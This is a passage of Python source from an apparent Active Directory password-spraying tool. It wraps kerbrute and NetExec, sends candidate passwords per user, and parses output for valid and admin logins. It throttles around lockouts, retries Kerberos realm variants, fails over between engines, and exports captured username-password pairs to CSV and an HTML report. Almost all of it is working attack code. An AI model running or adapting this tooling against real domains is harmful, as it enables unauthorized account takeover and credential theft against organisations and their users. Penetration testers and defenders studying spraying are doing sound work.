                or formula_candidate.startswith(("=", "+", "-", "@"))
            ):
                return "'" + value
            return value

        output = io.StringIO(newline="")
        writer = csv.writer(output)
        writer.writerow([
            "user",
            "password",
            "status",
            "is_admin",
            "credential_state",
            "password_pass",
            "batch",
            "engine",
            "protocol",
            "dispatches",
            "started_at",
            "completed_at",
            "detail",
            "password_change_command",
        ])

        for item in self.pair_results():
            is_admin = "Y" if item.get("is_admin") else "N"
            writer.writerow([
                safe_cell(item["user"]),
                safe_cell(item["secret"]),
                safe_cell(item.get("status", "")),
                is_admin,
                safe_cell(item.get("credential_state", "")),
                item.get("source_pass", ""),
                item.get("source_batch", ""),
                safe_cell(item.get("engine", "")),
                safe_cell(item.get("protocol", "")),
                item.get("dispatch_count", ""),
                item.get("started_at", ""),
                item.get("completed_at", ""),
                safe_cell(item.get("detail", "")),
                safe_cell(item.get("password_change_command", "")),
            ])

        csv_path = self.log_dir / "results.csv"
        self._atomic_write_text(csv_path, output.getvalue())

    # =============================================================================
    # Feature C: Credential-reuse detection across users
    # =============================================================================

    def detect_cred_reuse(self) -> List[Tuple[str, List[str]]]:
        """
        Detect passwords used by multiple users (credential sharing).
        Returns list of (password, [users]) sorted by user count descending.
        """
        by_pw: Dict[str, Set[str]] = {}
        for item in self.credentials:
            by_pw.setdefault(item["secret"], set()).add(item["user"])

        # Filter to passwords used by >1 user, sort by user count desc
        reused = sorted(
            [(pw, sorted(users)) for pw, users in by_pw.items() if len(users) > 1],
            key=lambda x: len(x[1]),
            reverse=True
        )
        return reused

    # =============================================================================
    # Feature D: Automatic throttling on response stress
    # =============================================================================

    def update_throttle(self, round_conn_fails: int) -> float:
        """
        Update throttle multiplier based on connection failures this round.
        Returns current multiplier after adjustment.
        """
        self.conn_fail_history.append(round_conn_fails)

        if round_conn_fails > 0:
            # Back off - increase multiplier (cap at 3x)
            self.delay_multiplier = min(self.delay_multiplier * 1.5, 3.0)
        else:
            # Recover - decrease multiplier toward 1.0
            self.delay_multiplier = max(self.delay_multiplier - 0.25, 1.0)

        return self.delay_multiplier

    # =============================================================================
    # Feature E: Timeline visualization
    # =============================================================================

    def record_timeline_event(self, event_type: str, detail: str = "", round_idx: Optional[int] = None):
        """
        Record a timeline event. Does NOT call save() (events flushed periodically).
        """
        self.timeline_events.append({
            "ts": datetime.datetime.now().isoformat(),
            "type": event_type,
            "detail": detail,
            "batch": round_idx,
        })

    # =============================================================================
    # Failover memory: engine health tracking
    # =============================================================================

    def _fresh_health(self) -> Dict:
        """Fresh engine health record."""
        return {
            "consecutive_failures": 0,
            "demoted": False,
            "cooldown_remaining": 0,
            "demote_count": 0,
            "last_reason": "",
        }

    def register_engine_failure(self, engine_key: str, abort_reason: str) -> None:
        """
        Register an engine failure and apply demotion logic if needed.
        Transient failures (timeout, exception) demote after threshold.
        Permanent failures (wrong-realm, binary-not-found, etc.) demote immediately.
        """
        h = self.engine_health.setdefault(engine_key, self._fresh_health())
        h["consecutive_failures"] += 1
        h["last_reason"] = abort_reason

        # Check if this should trigger demotion
        if abort_reason in HARD_DEMOTE_REASONS:
            self._demote(engine_key, abort_reason)
        elif h["consecutive_failures"] >= self.transient_threshold:
            self._demote(engine_key, abort_reason)

    def _demote(self, engine_key: str, abort_reason: str = "") -> None:
        """Mark an engine as demoted and set cooldown with exponential backoff."""
        h = self.engine_health[engine_key]
        if not h["demoted"]:
            h["demote_count"] = 0
        h["demoted"] = True
        h["demote_count"] = min(h["demote_count"] + 1, MAX_DEMOTE_COUNT)
        cooldown_ceiling = max(MAX_COOLDOWN, self.cooldown_rounds)
        h["cooldown_remaining"] = min(
            self.cooldown_rounds * (2 ** min(h["demote_count"] - 1, 16)),
            cooldown_ceiling,
        )
        # Record demotion event (will flush on next save)
        # Note: we don't have round_idx here; callers should record timeline if needed
        issue = humanize_tool_issue(abort_reason or str(h.get("last_reason", "")))
        detail = (
            f"{engine_key}: paused after {issue}; retry after "
            f"{h['cooldown_remaining']} password group(s)"
        )
        self.record_timeline_event("engine_demote", detail)

    def register_engine_success(self, engine_key: str) -> None:
        """Register an engine success and restore it from demoted state."""
        h = self.engine_health.setdefault(engine_key, self._fresh_health())
        was_demoted = h["demoted"]
        demote_count = h.get("demote_count", 0)
        h["consecutive_failures"] = 0
        h["demoted"] = False
        h["cooldown_remaining"] = 0
        h["demote_count"] = 0

        # Record restoration event if this engine was demoted
        if was_demoted:
            detail = f"{engine_key}: working again after {demote_count} pause(s)"
            self.record_timeline_event("engine_restore", detail)

    def tick_cooldowns(self, engine_keys: Optional[Set[str]] = None) -> None:
        """Decrement cooldowns that were already active when the round began."""
        records = self.engine_health.items()
        for engine_key, h in records:
            if engine_keys is not None and engine_key not in engine_keys:
                continue
            if h["demoted"] and h["cooldown_remaining"] > 0:
                h["cooldown_remaining"] -= 1

    def compute_effective_chain(self, full_chain: List["Engine"]) -> List["Engine"]:
        """
        Compute the per-password effective failover chain based on engine health.
        Healthy and due-for-probe engines retain original order. Engines still
        in cooldown are omitted rather than used as an undocumented fallback.
        """
        available = []
        for eng in full_chain:
            h = self.engine_health.get(str(eng))
            if not h or not h["demoted"] or h["cooldown_remaining"] == 0:
                available.append(eng)
        return available

    def select_demoted_probe(
        self,
        full_chain: List["Engine"],
        already_tried: Set[str],
    ) -> Optional["Engine"]:
        """Select one explicitly requested probe without silently bypassing cooldown."""
        for engine in full_chain:
            key = str(engine)
            health = self.engine_health.get(key, {})
            if health.get("demoted") and key not in already_tried:
                return engine
        return None

    def render_timeline_html(self) -> str:
        """Generate a compact self-contained run report and event timeline."""
        self.reconcile_ledger_metrics()
        events = self.timeline_events
        status_counts = self.pair_status_counts()
        pair_rows = self.pair_results()

        colors = {
            "batch_start": "#3498db",
            "spray": "#9b59b6",
            "pass_complete": "#5dade2",
            "credential": "#27ae60",
            "password_change_required": "#d16ee0",
            "lockout": "#e67e22",
            "reprioritize": "#f39c12",
            "throttle": "#e74c3c",
            "schedule_wait": "#1abc9c",
            "batch_end": "#95a5a6",
            "complete": "#2ecc71",
        }

        def parse_timestamp(value: Any) -> Optional[datetime.datetime]:
            if not value:
                return None
            try:
                return datetime.datetime.fromisoformat(str(value))
            except ValueError:
                return None

        def duration_text(start_value: Any, end_value: Any) -> str:
            start = parse_timestamp(start_value)
            end = parse_timestamp(end_value)
            if start is None or end is None or end < start:
                return "—"
            seconds = (end - start).total_seconds()
            if seconds < 60:
                return f"{seconds:.1f}s"
            minutes, remaining = divmod(seconds, 60)
            if minutes < 60:
                return f"{int(minutes)}m {remaining:.0f}s"
            hours, minutes = divmod(minutes, 60)
            return f"{int(hours)}h {int(minutes)}m"

        end_candidates = [
            parse_timestamp(event.get("ts"))
            for event in events
        ] + [
            parse_timestamp(row.get("completed_at"))
            for row in pair_rows
        ]
        end_times = [value for value in end_candidates if value is not None]
        run_end = max(end_times) if end_times else parse_timestamp(self.start_time)
        run_duration = duration_text(self.start_time, run_end)

        pass_rows: List[Dict[str, Any]] = []
        for position, secret in enumerate(self.cfg.passwords, start=1):
            records = list(self.pair_ledger.get(secret, {}).values())
            if not records:
                continue
            pass_statuses: Dict[str, int] = {}
            for record in records:
                status = str(record.get("status", "indeterminate"))
                pass_statuses[status] = pass_statuses.get(status, 0) + 1
            source_passes = [
                int(record["source_pass"])
                for record in records
                if isinstance(record.get("source_pass"), int)
                and not isinstance(record.get("source_pass"), bool)
            ]
            source_batches = [
                int(record["source_batch"])
                for record in records
                if isinstance(record.get("source_batch"), int)
                and not isinstance(record.get("source_batch"), bool)
            ]
            engines = sorted({
                str(record.get("engine", ""))
                for record in records
                if record.get("engine")
            })
            starts = sorted(
                str(record.get("started_at"))
                for record in records
                if parse_timestamp(record.get("started_at")) is not None
            )
            ends = sorted(
                str(record.get("updated_at"))
                for record in records
                if parse_timestamp(record.get("updated_at")) is not None
            )
            pass_rows.append({
                "pass": min(source_passes) if source_passes else position,
                "batch": min(source_batches) if source_batches else "—",
                "engine": ", ".join(engines) if engines else "—",
                "dispatches": sum(
                    max(0, int(record.get("dispatch_count", 0)))
                    for record in records
                ),
                "pairs": len(records),
                "valid": sum(
                    pass_statuses.get(status, 0)
                    for status in SUCCESS_PAIR_STATUSES
                ),
                "failed": pass_statuses.get("auth_failure", 0),
                "safety": (
                    pass_statuses.get("lockout", 0)
                    + pass_statuses.get("ambiguous_lockout", 0)
                ),
                "uncertain": (
                    pass_statuses.get("indeterminate", 0)
                    + pass_statuses.get("in_flight", 0)
                ),
                "simulated": pass_statuses.get("dry_run", 0),
                "duration": duration_text(
                    starts[0] if starts else None,
                    ends[-1] if ends else None,
                ),
            })

        html_parts = ["<!DOCTYPE html><html><head>"]
        html_parts.append("<meta charset='UTF-8'>")
        html_parts.append("<meta name='viewport' content='width=device-width, initial-scale=1'>")
        html_parts.append(f"<title>{PRODUCT_NAME} Timeline</title>")
        html_parts.append("<style>")
        html_parts.append(":root { color-scheme: dark; --bg:#171717; --panel:#242424; --panel2:#2d2d2d; --text:#d8d8d8; --muted:#969696; --accent:#4ec9b0; --line:#3b3b3b; }")
        html_parts.append("* { box-sizing: border-box; }")
        html_parts.append("body { font-family: Inter, 'Segoe UI', sans-serif; margin:0; padding:24px; background:var(--bg); color:var(--text); }")
        html_parts.append(".container { max-width:1180px; margin:0 auto; }")
        html_parts.append("h1 { color:var(--accent); margin:0; font-size:1.8rem; }")
        html_parts.append("h2 { margin:28px 0 10px; font-size:1.05rem; color:#eee; }")
        html_parts.append(".meta { color:var(--muted); margin:7px 0 18px; font-size:.9rem; }")
        html_parts.append(".cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(125px,1fr)); gap:9px; }")
        html_parts.append(".card { background:var(--panel); border:1px solid #303030; border-radius:7px; padding:11px 12px; }")
        html_parts.append(".card .label { color:var(--muted); font-size:.72rem; text-transform:uppercase; letter-spacing:.04em; }")
        html_parts.append(".card .value { margin-top:4px; font-size:1.35rem; font-weight:700; }")
        html_parts.append(".good { color:#55d68b; } .warn { color:#f0b35a; } .bad { color:#ff7373; } .accent { color:var(--accent); }")
        html_parts.append(".table-wrap { overflow-x:auto; border:1px solid var(--line); border-radius:7px; }")
        html_parts.append("table { width:100%; border-collapse:collapse; background:var(--panel); font-size:.86rem; }")
        html_parts.append("th,td { padding:9px 10px; text-align:left; border-bottom:1px solid var(--line); white-space:nowrap; }")
        html_parts.append("th { color:#bcbcbc; background:#202020; font-size:.72rem; text-transform:uppercase; }")
        html_parts.append("tr:last-child td { border-bottom:0; }")
        html_parts.append(".badge { display:inline-block; padding:2px 6px; border-radius:4px; font-size:.68rem; font-weight:700; text-transform:uppercase; color:#fff; }")
        html_parts.append(".events { border:1px solid var(--line); border-radius:7px; overflow:hidden; }")
        html_parts.append(".event { display:grid; grid-template-columns:155px 120px 1fr; gap:10px; align-items:center; padding:8px 10px; border-bottom:1px solid var(--line); background:var(--panel); border-left:4px solid #666; }")
        html_parts.append(".event:last-child { border-bottom:0; }")
        for etype, color in colors.items():
            html_parts.append(f".event-{etype} {{ border-left-color: {color}; }}")
        html_parts.append(".ts { color:var(--muted); font-size:.75rem; font-variant-numeric:tabular-nums; }")
        html_parts.append(".event-detail { color:#bdbdbd; font-size:.82rem; min-width:0; overflow-wrap:anywhere; }")
        html_parts.append(".batch-tag { color:#aaa; margin-right:8px; }")
        html_parts.append(".empty { padding:16px; color:var(--muted); background:var(--panel); border-radius:7px; }")
        html_parts.append("@media(max-width:700px){body{padding:14px}.event{grid-template-columns:1fr;gap:4px}.cards{grid-template-columns:repeat(2,1fr)}}")
        html_parts.append("</style></head><body>")

        html_parts.append("<div class='container'>")
        html_parts.append(f"<h1>{PRODUCT_NAME} Run Report</h1>")
        html_parts.append(
            "<div class='meta'>"
            f"{html.escape(self.cfg.domain)} → {html.escape(self.cfg.dc_ip)} · "
            f"Started {html.escape(self.start_time.replace('T', ' '))} · "
            f"Duration {html.escape(run_duration)} · {len(events)} timeline events"
            "</div>"
        )

        uncertain_pairs = (
            status_counts.get("indeterminate", 0)
            + status_counts.get("in_flight", 0)
        )
        cards = [
            ("Attempts sent", self.total_dispatches, "accent"),
            ("Unique pairs", self.credential_pair_count(), ""),
            ("Valid", self.successful_pair_count(), "good"),
            ("Failed", status_counts.get("auth_failure", 0), ""),
            ("Safety signals", self.lockout_count, "warn" if self.lockout_count else ""),
            ("Uncertain", uncertain_pairs, "bad" if uncertain_pairs else ""),
            ("Skipped", self.skipped_pair_count(), ""),
            ("Batches", self.completed_rounds, ""),
        ]
        html_parts.append("<div class='cards'>")
        for label, value, css_class in cards:
            html_parts.append(
                "<div class='card'>"
                f"<div class='label'>{html.escape(str(label))}</div>"
                f"<div class='value {css_class}'>{html.escape(str(value))}</div>"
                "</div>"
            )
        html_parts.append("</div>")

        html_parts.append("<h2>Password-pass activity</h2>")
        if pass_rows:
            html_parts.append("<div class='table-wrap'><table><thead><tr>")
            for heading in (
                "Pass", "Batch", "Tool", "Sent", "Pairs", "Valid",
                "Failed", "Safety", "Uncertain", "Simulated", "Duration",
            ):
                html_parts.append(f"<th>{heading}</th>")
            html_parts.append("</tr></thead><tbody>")
            for row in pass_rows:
                html_parts.append("<tr>")
                for key in (
                    "pass", "batch", "engine", "dispatches", "pairs", "valid",
                    "failed", "safety", "uncertain", "simulated", "duration",
                ):
                    css_class = ""
                    if key == "valid" and row[key]:
                        css_class = " class='good'"
                    elif key in {"safety", "uncertain"} and row[key]:
                        css_class = " class='warn'"
                    html_parts.append(
                        f"<td{css_class}>{html.escape(str(row[key]))}</td>"
                    )
                html_parts.append("</tr>")
            html_parts.append("</tbody></table></div>")
        else:
            html_parts.append("<div class='empty'>No password-pass activity recorded.</div>")

        html_parts.append("<h2>Credential findings</h2>")
        if self.credentials:
            html_parts.append("<div class='table-wrap'><table><thead><tr>")
            for heading in ("User", "State", "Admin", "Tool", "Pass", "Captured"):
                html_parts.append(f"<th>{heading}</th>")
            html_parts.append("</tr></thead><tbody>")
            for finding in self.credentials:
                state_label = credential_state_label(
                    str(finding.get("credential_state", "valid"))
                )
                html_parts.append(
                    "<tr>"
                    f"<td class='good'>{html.escape(str(finding['user']))}</td>"
                    f"<td>{html.escape(state_label)}</td>"
                    f"<td>{'Yes' if finding.get('is_admin') else 'No'}</td>"
                    f"<td>{html.escape(str(finding.get('engine') or '—'))}</td>"
                    f"<td>{html.escape(str(finding.get('source_pass') or '—'))}</td>"
                    f"<td>{html.escape(str(finding.get('captured_at') or '—').replace('T', ' '))}</td>"
                    "</tr>"
                )
            html_parts.append("</tbody></table></div>")
        else:
            html_parts.append("<div class='empty'>No valid credentials recorded.</div>")

        html_parts.append("<h2>Event timeline</h2>")
        html_parts.append("<div class='events'>")
        for ev in events:
            etype = ev.get("type", "unknown")
            color = colors.get(etype, "#666")
            safe_type = html.escape(str(etype), quote=True)
            html_parts.append(f"<div class='event event-{safe_type}'>")
            display_ts = str(ev.get("ts", "")).replace("T", " ").split(".", 1)[0]
            html_parts.append(f"<div class='ts'>{html.escape(display_ts)}</div>")
            html_parts.append(f"<div><span class='badge' style='background:{color}'>{safe_type}</span></div>")
            detail_parts = []
            if ev.get("batch"):
                detail_parts.append(
                    f"<span class='batch-tag'>Batch {html.escape(str(ev['batch']))}</span>"
                )
            if ev.get("detail"):
                detail_parts.append(html.escape(str(ev["detail"])))
            html_parts.append(
                f"<div class='event-detail'>{' '.join(detail_parts) or '—'}</div>"
            )
            html_parts.append("</div>")
        html_parts.append("</div>")

        html_parts.append("</div></body></html>")
        return "\n".join(html_parts)

# =============================================================================
# Engine invocation and classification
# =============================================================================

def password_change_line_type(status_text: str) -> Optional[LineType]:
    """Return the password-change credential state carried by tool output."""
    if any(
        re.search(pattern, status_text, re.IGNORECASE)
        for pattern in PASSWORD_EXPIRED_PATTERNS
    ):
        return LineType.PASSWORD_EXPIRED
    if any(
        re.search(pattern, status_text, re.IGNORECASE)
        for pattern in PASSWORD_MUST_CHANGE_PATTERNS
    ):
        return LineType.PASSWORD_MUST_CHANGE
    return None

def classify_line(
    engine: Engine,
    line: str,
    expected_secret: Optional[str] = None,
) -> Tuple[LineType, Optional[str]]:
    """
    Classify a tool output line.
    Returns (LineType, extracted_data) where data depends on type:
    - SUCCESS: (user, secret) tuple as one string
    - LOCKOUT: username
    - Others: None
    """
    # Kerbrute uses ANSI colors even when its output is piped. Strip them for
    # stable matching while retaining the original line in logs/the live feed.
    parsed_line = ANSI_ESCAPE_RE.sub("", line)
    status_text = parsed_line
    if expected_secret is not None:
        secret_marker = f":{expected_secret}"
        marker_offset = parsed_line.find(secret_marker)
        if marker_offset >= 0:
            status_text = parsed_line[marker_offset + len(secret_marker):]

    if engine.tool == "nxc":
        marker_match = re.search(r"\[[+-]\](.*)$", parsed_line)
        marker_text = marker_match.group(1) if marker_match else parsed_line
        identity_match = re.search(
            r"(?:(?P<domain>[^\\\s:]+)\\)?(?P<user>[^:\s]+):(?P<secret>.*)",
            marker_text,
        )
        reported_user = identity_match.group("user") if identity_match else None

        # Safety classifications must precede the broad NetExec failure matcher.
        for pat in NXC_LOCKOUT_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.LOCKOUT, reported_user)
        for pat in NXC_AMBIGUOUS_LOCKOUT_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.AMBIGUOUS_LOCKOUT, reported_user)

        for pat in NXC_CONN_ERROR_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.CONN_ERROR, reported_user)
        for pat in NXC_FATAL_ERROR_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.ERROR, parsed_line)

        password_change_type = password_change_line_type(status_text)
        if password_change_type is not None and identity_match:
            user = identity_match.group("user")
            reported_secret = (
                expected_secret
                if expected_secret is not None
                else re.sub(
                    r"\s+(?:STATUS_PASSWORD_EXPIRED|STATUS_PASSWORD_MUST_CHANGE)\b.*$",
                    "",
                    identity_match.group("secret"),
                    flags=re.IGNORECASE,
                )
            )
            return (password_change_type, f"{user}:{reported_secret}")

        for pat in NXC_SUCCESS_PATTERNS:
            if re.search(pat, parsed_line) and identity_match:
                user = identity_match.group("user")
                reported_secret = (
                    expected_secret
                    if expected_secret is not None
                    else identity_match.group("secret")
                )
                if expected_secret is None:
                    reported_secret = re.sub(
                        r"\s+(?:\(Pwn3d!\)|\[ADMIN\])\s*$",
                        "",
                        reported_secret,
                        flags=re.IGNORECASE,
                    )
                for admin_pat in NXC_ADMIN_PATTERNS:
                    if re.search(admin_pat, status_text, re.IGNORECASE):
                        return (LineType.ADMIN, f"{user}:{reported_secret}")
                return (LineType.SUCCESS, f"{user}:{reported_secret}")

        for pat in NXC_AUTHFAIL_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.AUTHFAIL, reported_user)
        if marker_match and marker_match.group(0).startswith("[-]") and identity_match:
            return (LineType.AUTHFAIL, reported_user)

    elif engine.tool == "kerbrute":
        summary = re.search(r"Done!\s+Tested\s+(\d+)\s+logins?", parsed_line, re.IGNORECASE)
        if summary:
            return (LineType.SUMMARY, summary.group(1))

        principal_match = re.search(r"\[!\]\s+([^:\s]+)(?::.*?)?\s+-", parsed_line)
        if principal_match is None:
            principal_match = re.search(
                r"\b([A-Za-z0-9_.\-$]+@[A-Za-z0-9_.-]+)\b",
                parsed_line,
            )
        reported_principal = principal_match.group(1) if principal_match else None

        for pat in KERBRUTE_LOCKOUT_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.LOCKOUT, reported_principal)
        for pat in KERBRUTE_AMBIGUOUS_LOCKOUT_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.AMBIGUOUS_LOCKOUT, reported_principal)

        # Realm/domain failures are known not to validate the supplied secret.
        for pat in KERBRUTE_ERROR_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.ERROR, parsed_line)
        for pat in KERBRUTE_CONN_ERROR_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.CONN_ERROR, reported_principal)

        for pat in KERBRUTE_SUCCESS_PATTERNS:
            if re.search(pat, parsed_line, re.IGNORECASE):
                m = re.search(
                    r"\[\+\]\s+VALID LOGIN(?: WITH ERROR)?:\s+([^:\s]+):(.+?)\s*$",
                    parsed_line,
                    re.IGNORECASE,
                )
                if m:
                    user, secret = m.groups()
                    if "VALID LOGIN WITH ERROR" in parsed_line.upper():
                        secret = re.sub(r"\s+\([^\n]*\)\s*$", "", secret)
                    password_change_type = password_change_line_type(status_text)
                    return (
                        password_change_type or LineType.SUCCESS,
                        f"{user}:{secret}",
                    )

        # In verbose mode every ordinary failure uses this principal-prefixed form.
        if reported_principal:
            return (LineType.AUTHFAIL, reported_principal)
        for pat in KERBRUTE_AUTHFAIL_PATTERNS:
            if re.search(pat, status_text, re.IGNORECASE):
                return (LineType.AUTHFAIL, reported_principal)

    return (LineType.INFO, None)


def _normalize_reported_user(
    user: str,
    configured_users: List[str],
    domain: str = "",
) -> str:
    """Map an engine identity back to its configured display spelling."""
    reported_key = canonical_identity(user, domain)
    for configured in configured_users:
        if reported_key == canonical_identity(configured, domain):
            return configured
        if str(user).strip().casefold() in _identity_aliases(configured, domain):
            return configured
    return str(user).strip()

def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, realm: Optional[str] = None) -> RoundResult:
    """
    Run one engine invocation for one password/hash. Stream stdout line-by-line,
    classify, update UI/state, and return RoundResult.
    Connection errors and unsuccessful process exits abort this engine attempt
    so the failover chain can handle the remaining users.

    Feature 1 (credential-reuse matrix): Uses a filtered userlist per password.

    Args:
        realm: Override domain for kerbrute (realm retry). If None, uses cfg.domain.
    """
    aggregate = RoundResult()
    if state.signal_count_for_secret(secret) > cfg.lockout_burst:
        aggregate.aborted = True
        aggregate.abort_reason = "lockout-burst"
        return aggregate
    eligible_users = state.eligible_users_for(secret)
    if not eligible_users:
        ui.console.print(
            "[*] No eligible users remain for this secret; skipping",
            style="dim",
        )
        aggregate.clean_finish = True
        aggregate.reconciled_complete = True
        return aggregate

    skipped = len(cfg.users) - len(eligible_users)
    ui.console.print(
        f"[*] Strict dispatch: {len(eligible_users)} eligible users "
        f"({skipped} attempted or quarantined)",
        style="dim",
    )

    for user in eligible_users:
        # Recheck because a prior result in this pass may have quarantined an
        # equivalent spelling of this identity.
        if user not in state.eligible_users_for(secret):
            continue
        if not state.begin_attempt(secret, user, engine):
            continue
        aggregate.dispatches += 1

        userlist_path = state.write_userlist([user])
        try:
            child = _spray_one_password_impl(
                engine,
                cfg,
                secret,
                ui,
                state,
                userlist_path,
                realm,
                expected_user=user,
            )
        finally:
            try:
                Path(userlist_path).unlink()
            except FileNotFoundError:
                pass

        status = state.pair_status(secret, user)
        if status == "in_flight":
            if child.abort_reason in NO_AUTH_ABORT_REASONS:
                state.cancel_attempt(secret, user)
            else:
                state.finish_attempt(
                    secret,
                    user,
                    "indeterminate",
                    child.abort_reason or "engine ended without a terminal user result",
                )
                child.indeterminate_users.add(state._display_user(user))

        _merge_round_result(aggregate, child)

        if state.signal_count_for_secret(secret) > cfg.lockout_burst:
            aggregate.aborted = True
            aggregate.abort_reason = "lockout-burst"
            aggregate.clean_finish = False
            aggregate.reconciled_complete = False
            ui.set_abort(aggregate.abort_reason)
            return aggregate

        if child.aborted:
            aggregate.aborted = True
            aggregate.abort_reason = child.abort_reason
            aggregate.clean_finish = False
            aggregate.reconciled_complete = False
            return aggregate

        if not child.reconciled_complete:
            aggregate.aborted = True
            aggregate.abort_reason = "unreconciled-output"
            aggregate.clean_finish = False
            aggregate.reconciled_complete = False
            return aggregate

    aggregate.clean_finish = True
    aggregate.reconciled_complete = True
    return aggregate


def _merge_round_result(target: RoundResult, source: RoundResult) -> None:
    """Merge one strict per-identity result into a pass result."""
    for pair in source.successes:
        if pair not in target.successes:
            target.successes.append(pair)
    for pair in source.admin_users:
        if pair not in target.admin_users:
            target.admin_users.append(pair)
    for finding in source.password_change_required:
        if finding not in target.password_change_required:
            target.password_change_required.append(finding)
    target.lockouts.update(source.lockouts)
    target.ambiguous_lockouts.update(source.ambiguous_lockouts)
    target.unknown_lockouts += source.unknown_lockouts
    target.unknown_ambiguous_lockouts += source.unknown_ambiguous_lockouts
    target.conn_fails += source.conn_fails
    target.errors.extend(source.errors)
    target.terminal_users.update(source.terminal_users)
    target.indeterminate_users.update(source.indeterminate_users)
    if source.summary_tested is not None:
        target.summary_tested = (target.summary_tested or 0) + source.summary_tested


def _stop_process(proc: Optional[subprocess.Popen]) -> None:
    """Best-effort termination for an engine process and its descendants."""
    if proc is None:
        return
    pid = getattr(proc, "pid", None)
    group_id = pid if isinstance(pid, int) and pid > 0 and hasattr(os, "killpg") else None
    group_signaled = False
    try:
        # start_new_session=True makes the child PID its process-group ID. Use
        # that known ID directly: getpgid(pid) fails if a short-lived wrapper
        # exits while a grandchild still owns the stdout pipe.
        if group_id is not None:
            try:
                os.killpg(group_id, signal.SIGTERM)
                group_signaled = True
            except (OSError, ProcessLookupError):
                group_signaled = False
        if not group_signaled and proc.poll() is None:
            proc.terminate()

        deadline = time.monotonic() + 2
        if proc.poll() is None:
            try:
                proc.wait(timeout=max(0.05, deadline - time.monotonic()))
            except subprocess.TimeoutExpired:
                pass

        group_alive = group_signaled
        if group_signaled and group_id is not None:
            while time.monotonic() < deadline:
                try:
                    os.killpg(group_id, 0)
                except ProcessLookupError:
                    group_alive = False
                    break
                except PermissionError:
                    group_alive = True
                else:
                    group_alive = True
                time.sleep(0.05)

        if group_alive and group_id is not None:
            try:
                os.killpg(group_id, signal.SIGKILL)
            except (OSError, ProcessLookupError):
                pass
        if proc.poll() is None:
            try:
                proc.kill()
            finally:
                try:
                    proc.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    pass
    except OSError:
        # The child may have exited between poll() and terminate().
        return


class EngineOutputTimeout(TimeoutError):
    def __init__(self, reason: str):
        super().__init__(reason)
        self.reason = reason


def _iter_process_output(
    proc: subprocess.Popen,
    *,
    total_timeout: int,
    idle_timeout: int,
):
    """Yield child output while enforcing total and no-output deadlines."""
    events: queue.Queue = queue.Queue()
    eof = object()

    def read_stdout() -> None:
        try:
            if proc.stdout is not None:
                for output_line in proc.stdout:
                    events.put(output_line)
        except BaseException as exc:  # Forward reader failures to the owner thread.
            events.put(exc)
        finally:
            events.put(eof)

    reader = threading.Thread(target=read_stdout, name="authtempo-engine-output", daemon=True)
    reader.start()
    started = time.monotonic()
    last_output = started

    while True:
        now = time.monotonic()
        total_remaining = total_timeout - (now - started)
        idle_remaining = idle_timeout - (now - last_output)
        if total_remaining <= 0:
            raise EngineOutputTimeout("engine-timeout")
        if idle_remaining <= 0:
            raise EngineOutputTimeout("idle-timeout")
        try:
            event = events.get(timeout=min(total_remaining, idle_remaining))
        except queue.Empty as exc:
            now = time.monotonic()
            reason = (
                "engine-timeout"
                if now - started >= total_timeout
                else "idle-timeout"
            )
            raise EngineOutputTimeout(reason) from exc
        if event is eof:
            return
        if isinstance(event, BaseException):
            raise event
        last_output = time.monotonic()
        yield event


def spray_kerbrute_with_realm_retry(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State) -> RoundResult:
    """
    Run kerbrute with automatic realm-variant retry on wrong-realm failures.
    Tries realm candidates (as-given, UPPER, parent, UPPER-parent) until one works.
    Caches the working realm for the rest of the run.
    """
    # Fast path: already know a working realm. If it is rejected later (for
    # example after a resumed run points at a changed KDC), invalidate the cache
    # and fall through to the remaining candidates.
    if state.working_realm:
        cached_realm = state.working_realm
        cached_result = spray_one_password(engine, cfg, secret, ui, state, cached_realm)
        if not (cached_result.aborted and cached_result.abort_reason == "wrong-realm"):
            return cached_result
        if cached_realm not in state.known_bad_realms:
            state.known_bad_realms.append(cached_realm)
        state.working_realm = None
        ui.console.print(
            f"[!] kerbrute: cached realm '{escape(cached_realm)}' was rejected; "
            "trying remaining variants",
            style="yellow",
        )

    # Try each untried realm candidate
    candidates = [r for r in cfg.realm_candidates if r not in state.known_bad_realms]
    if not candidates:
        # All variants exhausted
        return RoundResult(
            aborted=True,
            abort_reason="wrong-realm",
            errors=["all realm variants exhausted"]
        )

    last_result = None
    for idx, realm in enumerate(candidates):
        ui.console.print(f"[*] kerbrute: trying realm '{escape(realm)}' ({idx+1}/{len(candidates)})", style="cyan")
        result = spray_one_password(engine, cfg, secret, ui, state, realm)

        if result.aborted and result.abort_reason == "wrong-realm":
            state.known_bad_realms.append(realm)
            remaining = len(candidates) - idx - 1
            ui.console.print(f"[!] kerbrute: realm '{realm}' rejected (wrong realm) → crossing off, trying next ({remaining} variants left)", style="yellow")
            last_result = result
            continue

        # Not a realm abort (success, or different abort) -> realm is acceptable
        if not result.aborted:
            if not result.reconciled_complete:
                result.aborted = True
                result.clean_finish = False
                result.abort_reason = "unreconciled-output"
                return result
            if result.dispatches:
                state.working_realm = realm
                ui.console.print(f"[+] kerbrute: realm '{realm}' works — cached for the rest of the run", style="green")
                state.record_timeline_event("realm_found", f"working realm: {realm}")
            return result

        # Different abort reason (not realm-related)
        return result

    # All candidates exhausted
    ui.console.print(f"[!] kerbrute: all {len(cfg.realm_candidates)} realm variants rejected — demoting kerbrute, failing over to nxc", style="yellow")
    return last_result if last_result else RoundResult(aborted=True, abort_reason="wrong-realm")


def _spray_one_password_impl(
    engine: Engine,
    cfg: Config,
    secret: str,
    ui: RichUI,
    state: State,
    userlist_path: str,
    realm: Optional[str] = None,
    expected_user: Optional[str] = None,
) -> RoundResult:
    """
    Internal implementation of spray_one_password after userlist filtering.
    Connection errors and unsuccessful process exits abort this engine attempt
    so the failover chain can handle it.

    Args:
        realm: Override domain for kerbrute (realm retry). If None, uses cfg.domain.
    """
    result = RoundResult()
